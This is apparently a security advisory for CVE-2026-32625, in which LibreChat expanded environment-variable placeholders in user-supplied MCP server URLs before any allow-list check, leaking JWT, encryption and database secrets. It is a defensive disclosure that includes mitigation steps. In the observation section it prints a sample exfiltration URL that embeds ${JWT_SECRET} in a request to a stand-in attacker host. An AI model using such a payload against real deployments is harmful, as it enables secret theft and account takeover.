---
caseId: "051"
title: "LibreChat expanded environment-variable placeholders in user-supplied MCP server URLs, leaking JWT and database secrets"
filed: "2026-08-05"
filedDisplay: "05 Aug 2026"
firstObserved: "04 Jun 2026"
severity: high
category: "Configuration / default-settings failure"
status: "Patched"
affectedSystems: "LibreChat (<= 0.8.3, MCP server integration)"
cve: "CVE-2026-32625"
readTime: "4 min read"
related: ["016", "038", "028"]
---

## Summary

LibreChat lets authenticated users register their own MCP servers so an AI conversation can call out to external tools. The URL field for that registration went through a Zod validation layer that expanded `${VAR}` placeholders against the LibreChat backend's own `process.env` before checking the destination against any allow-list. Any authenticated user — no administrative privileges required — could submit a server URL containing a placeholder for a secret environment variable and have LibreChat interpolate that secret directly into an outbound request to a domain the attacker controlled.

## What was observed

LibreChat stores its database connection string, JWT signing key, and credential-encryption keys in environment variables: `MONGO_URI`, `JWT_SECRET`, `CREDS_KEY`, `CREDS_IV`. The MCP server configuration form treated the URL a user supplied as a template rather than a literal string, substituting `${VAR}` references against the server process's own environment during schema validation — a step that ran before the resulting URL was checked against any allowed-destination list.

```
# user-supplied MCP URL: https://attacker.example/${JWT_SECRET}
# validation layer expands ${JWT_SECRET} against process.env
# before the destination host is checked against an allow-list
```

Submitting a URL such as `https://attacker.example/${JWT_SECRET}` caused the backend to resolve the placeholder and connect outbound with the secret embedded in the path, landing in the attacker's own server logs. Because the four secrets involved cover the entire LibreChat trust base, the practical impact went well beyond reading one value: `JWT_SECRET` let an attacker forge authentication tokens for any account, including administrators; `CREDS_KEY` and `CREDS_IV` allowed decryption of every third-party API key LibreChat had stored on users' behalf; and `MONGO_URI` handed over direct read-write access to the underlying database. A single low-privilege account was sufficient to reach all four, since MCP server registration was not gated behind an administrative role in the affected versions.

## Mitigation

Upgrade to LibreChat 0.8.4-rc1 or later, which removes environment-variable interpolation from user-supplied MCP server URLs. Organizations running an affected version should rotate `CREDS_KEY`, `CREDS_IV`, `JWT_SECRET`, and `MONGO_URI`, re-encrypt stored third-party credentials after rotating the encryption keys, and invalidate existing sessions to force re-authentication under the new signing key. Until patched, restrict MCP server registration to trusted administrators rather than leaving it open to any authenticated user. The underlying lesson generalizes beyond this one form field: any code path that expands template syntax in user input against a server's own configuration store is a secrets-disclosure channel waiting for a destination, whether or not the word "template" appears anywhere in the code.
